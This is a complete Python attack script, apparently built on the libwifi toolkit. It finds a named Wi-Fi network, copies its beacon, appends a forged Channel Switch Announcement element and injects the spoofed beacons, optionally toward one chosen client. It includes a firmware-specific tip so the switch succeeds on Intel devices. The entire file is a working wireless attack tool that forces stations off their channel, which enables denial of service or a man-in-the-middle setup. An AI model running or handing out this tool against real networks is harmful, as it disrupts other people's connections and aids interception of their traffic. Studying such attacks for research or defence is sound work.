#!/usr/bin/env python3
from libwifi import *
import argparse


def construct_csa(channel, count=1):
	switch_mode = 1			# STA should not Tx untill switch is completed
	new_chan_num = channel	# Channel it should switch to
	switch_count = count	# Immediately make the station switch

	# Contruct the IE
	payload = struct.pack("<BBB", switch_mode, new_chan_num, switch_count)
	return Dot11Elt(ID=IEEE_TLV_TYPE_CSA, info=payload)


def append_csa(p, channel, count=1):
	p = p.copy()

	el = p[Dot11Elt]
	prevel = None
	while isinstance(el, Dot11Elt):
		prevel = el
		el = el.payload

	prevel.payload = construct_csa(channel, count)

	return p


def inject_csa_beacon(beacon):
	channel = orb(get_element(beacon, IEEE_TLV_TYPE_CHANNEL).info)
	newchannel = 1 if channel >= 6 else 11

	# Note: Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
	# followed by one with a value of 1. When starting with 1 it errors out.
	csabeacon = append_csa(beacon, newchannel, 2)
	sendp(csabeacon)

	csabeacon = append_csa(beacon, newchannel, 1)
	sendp(csabeacon)


def main():
	# Load arguments: target SSID
	parser = argparse.ArgumentParser(description=f"Spoof beacons with malicious Channel Switch Announcement (CSA) elements.")
	parser.add_argument('iface', help="Interface that will be used to inject frames.")
	parser.add_argument('ssid', help="Network to target.")
	parser.add_argument('--target', help="Inject beacons towards a specific reciever.")
	opt = parser.parse_args()

	conf.iface = opt.iface

	# Search for the target network
	log(STATUS, f"Searching for network {opt.ssid}")
	beacon = find_network(opt.iface, opt.ssid)
	if beacon is None:
		log(ERROR, f"Unable to detect network {opt.ssid} in 2.4 GHz band!")
		quit(1)
	opt.bss = beacon.addr2
	log(STATUS, f"Using bss MAC address {opt.bss}")

	# If requested, inject beacons to a specific reciever
	if opt.target is not None:
		log(STATUS, f"Will inject beacons towards {opt.target}")
		beacon.addr1 = opt.target

	# Inject malicious beacons
	inject_csa_beacon(beacon)


main()

